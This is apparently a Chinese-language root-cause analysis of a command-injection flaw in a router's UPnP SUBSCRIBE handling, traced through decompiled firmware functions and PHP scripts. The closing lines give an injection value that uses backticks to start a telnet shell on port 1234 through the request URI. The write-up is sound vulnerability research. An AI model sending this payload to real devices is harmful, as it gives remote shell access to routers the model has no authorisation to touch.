<pre class=" language-c"><code class="language-c">undefined4
<span class="token function">FUN_0041420c</span><span class="token punctuation">(</span>undefined4 param_1<span class="token punctuation">,</span>uint param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span>undefined4 buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">,</span>
               <span class="token keyword">int</span> param_6<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* 创建socket */</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> __fd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar1 <span class="token operator">=</span> <span class="token function">FUN_00413810</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span>param_3<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>首先<code>FUN_0041372c()</code>创建socket</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0041372c</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>
  sockaddr local_80 <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
     <span class="token function">fcntl</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       param_1 <span class="token operator">=</span> <span class="token string">"/var/run/xmldb_sock"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_family <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token function">snprintf</span><span class="token punctuation">(</span>local_80<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sa_data<span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar1 <span class="token operator">=</span> <span class="token function">connect</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>local_80<span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     iVar2 <span class="token operator">=</span> __fd<span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       iVar2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
       <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>之后当_fd &gt; -1时，buf被传入FUN_00413810()中，作为第四个参数，进入该函数。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_00413810</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span>undefined2 param_2<span class="token punctuation">,</span>undefined4 param_3<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span>ushort param_5<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
  sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token operator">&amp;</span>local_20<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> sVar1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
     sVar1 <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>param_5<span class="token punctuation">,</span><span class="token number">0x4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
       uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现我们的buf被send给创建好的socket。其实是发送给了php脚本进行处理。</p>
<p>至此整个流程为：buf -&gt; <code>xmldbc_ephp()</code> -&gt; <code>FUN_0041420c()</code> -&gt; <code>FUN_00413810()</code> -&gt; socket。经过xmldbc_ephp()处理后，由buf中的参数<code>/htdocs/upnp/run.NOTIFY.php</code>这个php文件进行处理。</p>
<p>run.NOTIFY.php内容为：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/phplib/upnp/xnode.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gvar.php"</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"/htdocs/upnpinc/gena.php"</span><span class="token punctuation">;</span>

<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token variable">$G_GENA_NODEBASE</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$gena_path</span> <span class="token operator">=</span> <span class="token variable">$gena_path</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$SERVICE</span><span class="token punctuation">;</span>
<span class="token function">GENA_subscribe_cleanup</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/* IGD services */</span>
<span class="token keyword">if</span>        <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"L3Forwarding1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.Layer3Forwarding.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"OSInfo1"</span><span class="token punctuation">)</span>            <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.OSInfo.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANCommonIFC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANCommonInterfaceConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANEthLinkC1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANEthernetLinkConfig.1.php"</span><span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WANIPConn1"</span><span class="token punctuation">)</span>        <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WANIPConnection.1.php"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* WFA services */</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SERVICE</span> <span class="token operator">==</span> <span class="token string">"WFAWLANConfig1"</span><span class="token punctuation">)</span>    <span class="token variable">$php</span> <span class="token operator">=</span> <span class="token string">"NOTIFY.WFAWLANConfig.1.php"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"SUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SID</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">GENA_subscribe_sid</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">,</span>  <span class="token variable">$TIMEOUT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$METHOD</span> <span class="token operator">==</span> <span class="token string">"UNSUBSCRIBE"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">GENA_unsubscribe</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$SID</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>可以看到当请求方式为SUBSCRIBE的时候才会进一步处理，该脚本中<code>GENA_subscribe_new()</code>处理了变量<code>$SHELL_FILE</code></p>
<pre class=" language-php"><code class="language-php"><span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$gena_path</span><span class="token punctuation">,</span> <span class="token variable">$HOST</span><span class="token punctuation">,</span> <span class="token variable">$REMOTE</span><span class="token punctuation">,</span> <span class="token variable">$URI</span><span class="token punctuation">,</span> <span class="token variable">$TIMEOUT</span><span class="token punctuation">,</span> <span class="token variable">$SHELL_FILE</span><span class="token punctuation">,</span> <span class="token string">"/htdocs/upnp/"</span><span class="token punctuation">.</span><span class="token variable">$php</span><span class="token punctuation">,</span> <span class="token variable">$INF_UID</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>使用命令<code>grep -nr "GENA_subscribe_new"</code>搜索<code>GENA_subscribe_new()</code>发现其定义在upnpinc/gena.php脚本中。 </p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_new</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$remote</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">anchor</span><span class="token punctuation">(</span><span class="token variable">$node_base</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$found</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/* find subscription index &amp; uuid */</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token string">"subscription"</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"host"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$host</span> <span class="token operator">&amp;&amp;</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"uri"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token variable">$uri</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token variable">$found</span> <span class="token operator">=</span> <span class="token variable">$InDeX</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$found</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$count</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token string">"uuid:"</span><span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/genuuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$index</span> <span class="token operator">=</span> <span class="token variable">$found</span><span class="token punctuation">;</span>
        <span class="token variable">$new_uuid</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* get timeout */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span><span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$timeout</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$new_timeout</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/device/uptime"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$timeout</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">/* set to nodes */</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/remote"</span><span class="token punctuation">,</span>    <span class="token variable">$remote</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uuid"</span><span class="token punctuation">,</span>        <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/host"</span><span class="token punctuation">,</span>        <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/uri"</span><span class="token punctuation">,</span>        <span class="token variable">$uri</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/timeout"</span><span class="token punctuation">,</span>    <span class="token variable">$new_timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"subscription:"</span><span class="token punctuation">.</span><span class="token variable">$index</span><span class="token punctuation">.</span><span class="token string">"/seq"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$new_uuid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$new_uuid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>其中<code>GENA_subscribe_http_resp($new_uuid, $timeout)</code>是加载对订阅事件的应答报文头部。并没有处理<code>$shell_file</code></p>
<p>文件：gena.php，<code>GENA_subscribe_http_resp()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_subscribe_http_resp</span><span class="token punctuation">(</span><span class="token variable">$sid</span><span class="token punctuation">,</span> <span class="token variable">$timeout</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">/* Generate HTTP header */</span>
    <span class="token keyword">echo</span> <span class="token string">"HTTP/1.1 200 OK\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"SID: "</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span><span class="token string">"\r\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"TIMEOUT: "</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$timeout</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string">"Second-infinite"</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"Second-"</span><span class="token punctuation">.</span><span class="token variable">$timeout</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"\r\n\r\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>继续跟踪<code>$shell_file</code>，发现真正处理<code>$shell_file</code>的<code>GENA_notify_init()</code>函数。</p>
<p>文件：gena.php，<code>GENA_notify_init()</code>函数 </p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">GENA_notify_init</span><span class="token punctuation">(</span><span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token variable">$target_php</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$uri</span><span class="token punctuation">,</span> <span class="token variable">$sid</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    <span class="token variable">$inf_path</span> <span class="token operator">=</span> <span class="token function">XNODE_getpathbytarget</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"inf"</span><span class="token punctuation">,</span> <span class="token string">"uid"</span><span class="token punctuation">,</span> <span class="token variable">$inf_uid</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't find inf_path by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$phyinf</span> <span class="token operator">=</span> <span class="token function">PHYINF_getifname</span><span class="token punctuation">(</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$inf_path</span><span class="token punctuation">.</span><span class="token string">"/phyinf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$phyinf</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">TRACE_debug</span><span class="token punctuation">(</span><span class="token string">"can't get phyinf by $inf_uid="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span><span class="token string">"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"/runtime/upnpmsg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$upnpmsg</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token variable">$upnpmsg</span> <span class="token operator">=</span> <span class="token string">"/dev/null"</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span>
        <span class="token string">"#!/bin/sh\n"</span><span class="token punctuation">.</span>
        <span class="token string">'echo "[$0] ..." > '</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">.</span>
        <span class="token string">"xmldbc -P "</span><span class="token punctuation">.</span><span class="token variable">$target_php</span><span class="token punctuation">.</span>
            <span class="token string">" -V INF_UID="</span><span class="token punctuation">.</span><span class="token variable">$inf_uid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_URL="</span><span class="token punctuation">.</span><span class="token variable">$uri</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_HOST="</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SID="</span><span class="token punctuation">.</span><span class="token variable">$sid</span><span class="token punctuation">.</span>
            <span class="token string">" -V HDR_SEQ=0"</span><span class="token punctuation">.</span>
            <span class="token string">" | httpc -i "</span><span class="token punctuation">.</span><span class="token variable">$phyinf</span><span class="token punctuation">.</span><span class="token string">" -d \""</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">.</span><span class="token string">"\" -p TCP > "</span><span class="token punctuation">.</span><span class="token variable">$upnpmsg</span><span class="token punctuation">.</span><span class="token string">"\n"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token variable">$shell_file</span><span class="token punctuation">,</span> <span class="token string">"rm -f "</span><span class="token punctuation">.</span><span class="token variable">$shell_file</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>发现了<code>$shell_file</code>最后结束的地方，该函数两次调用<code>fwrite()</code>，在网上查阅了正常PHP函数<code>fwrite()</code>用法是结合<code>fopen()</code>来创建文件，这里的<code>fwrite()</code>可能重新定义了。第一次调用<code>fwrite()</code>，是新建一个名为<code>$shell_file</code>的文件。这没什么问题。</p>
<p>可以回溯之前提到的<code>sprintf()</code>，里面的SHELL_FILE变量是可以被我们控制的。</p>
<pre class=" language-c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>
                       <span class="token string">"%s\nMETHOD=SUBSCRIBE\nINF_UID=%s\nSERVICE=%s\nHOST=%s\nURI=/%s\nTIMEOUT=%d\nREMOTE=%s\nSHELL_FILE=%s/%s_%d.sh"</span>
                       <span class="token punctuation">,</span><span class="token string">"/htdocs/upnp/run.NOTIFY.php"</span><span class="token punctuation">,</span>request_method<span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>http_callback <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">,</span>
                       http_sid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>real_timeout<span class="token punctuation">,</span>remote_addr<span class="token punctuation">,</span><span class="token string">"/var/run"</span><span class="token punctuation">,</span>request_uri_0x3f<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=file_name"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>file_name_pid<span class="token punctuation">.</span>sh</code></pre>
<p>问题出现在第二次调用<code>fwrite()</code>是向这个文件加入一行<code>"rm -f ".$shell_file."\n"</code>，目的是为了删除新建的文件。问题就出现在这个地方。</p>
<pre class=" language-php"><code class="language-php">如果<span class="token constant">REQUEST_URI</span> <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//IP:PORT/*?service=`telnetd -p 1234`"</span>
新建的文件完整路径应该是：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh    
系统运行命令 rm <span class="token operator">-</span>rf <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>`telnetd <span class="token operator">-</span>p <span class="token number">1234</span>`_pid<span class="token punctuation">.</span>sh</code></pre>
<p>如果rm 命令遇到反引号，rm命令将会运行失败，并且继续执行反引号里面的命令。所以只要控制好SHELL_FILE变量就能触发漏洞。</p>
